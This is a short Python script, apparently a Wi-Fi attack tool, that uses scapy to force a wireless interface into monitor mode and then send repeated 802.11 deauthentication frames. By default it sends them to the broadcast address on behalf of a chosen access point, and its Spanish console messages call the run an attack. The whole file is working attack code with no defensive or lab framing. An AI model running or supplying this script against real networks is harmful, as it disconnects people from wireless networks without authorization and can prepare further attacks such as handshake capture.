from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
import subprocess
import time

def check_monitor(interface):
    result = subprocess.run(['iw', 'dev', interface], capture_output=True, text=True)
    return 'type monitor' in result.stdout

def send_deauth(interface, bssid, client='ff:ff:ff:ff:ff:ff', count=20, interval=0.1):
    if not check_monitor(interface):
        print(f"[!] La interfaz {interface} no está en modo monitor. Intentando forzar...")
        subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
        subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], capture_output=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)

    pkt = (RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))

    print(f"[*] Enviando {count} tramas deauth a {client} desde {bssid}...")
    for _ in range(count):
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(interval)
    print("[+] Ataque deauth finalizado.")
